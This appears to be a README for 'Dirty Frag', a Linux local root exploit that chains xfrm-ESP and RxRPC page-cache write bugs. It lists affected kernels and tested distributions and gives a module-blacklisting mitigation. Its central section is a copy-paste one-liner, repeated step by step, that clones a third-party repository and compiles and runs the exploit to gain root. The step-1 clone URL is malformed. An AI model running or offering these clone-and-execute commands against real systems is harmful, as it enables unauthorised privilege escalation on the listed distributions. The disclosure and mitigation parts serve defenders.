# Dirty Frag: Universal Linux LPE

# Abstract

![tux](demo.gif)

This document describes the Dirty Frag vulnerability class, first discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel), which can obtain root privileges on major Linux distributions by chaining the `xfrm-ESP Page-Cache Write` vulnerability and the `RxRPC Page-Cache Write` vulnerability.

Dirty Frag is a case that extends the bug class to which [Dirty Pipe](https://dirtypipe.cm4all.com/) and [Copy Fail](https://copy.fail/) belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high.


Because the embargo has currently been broken, no patch or CVE exists. After consultation with the maintainers on linux-distros@vs.openwall.org and at their request, this Dirty Frag document is being published. For the disclosure timeline, refer to the technical details.

# Exploiting

## Copy - Paste 
```
git clone https://github.com/GOVIND28/dirtyFrag.git && cd dirtyFrag && gcc -O0 -Wall -o dirtyfrag dirtyfrag.c -lutil && ./dirtyfrag
```

## Step By Step
### 1. Clone Repository
```
git clone https://://github.com/GOVIND28/dirtyFrag.git
```
### 2. Move Into Directory
```
cd dirtyFrag
```
### 3. Compile Exploit
```
gcc -O0 -Wall -o dirtyfrag dirtyfrag.c -lutil
```
### 4. Run Exploit
```
./dirtyfrag
```


This PoC is provided as accurate information following consultation with linux-distros. Do not use it on systems that you are not authorized to test.

> ⚠️ **Important:** After running this exploit, the page cache is contaminated. To clear the polluted page cache and ensure system stability, either run:
>
> ```bash
> echo 3 > /proc/sys/vm/drop_caches
> ```
>
> or reboot the system.

# Affected Versions

The xfrm-ESP Page-Cache Write vulnerability is in scope from cac2661c53f3 (2017-01-17) up to upstream, and the RxRPC Page-Cache Write vulnerability is in scope from 2dc334f1a63a (2023-06) up to upstream.

In other words, the effective lifetime of the vulnerabilities is about 9 years.

This Dirty Frag has been tested on the following distribution versions.

- Ubuntu 24.04.4: 6.17.0-23-generic
- RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
- openSUSE Tumbleweed: 7.0.2-1-default
- CentOS Stream 10: 6.12.0-224.el10.x86_64
- AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
- Fedora 44: 6.19.14-300.fc44.x86_64

# Mitigation


1. Because the responsible disclosure schedule and the embargo have been broken, no patch exists for any distribution. Use the following command to remove the modules in which the vulnerabilities occur and clear the page cache.
```bash
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
```

2. Once each distribution backports a patch, update accordingly.
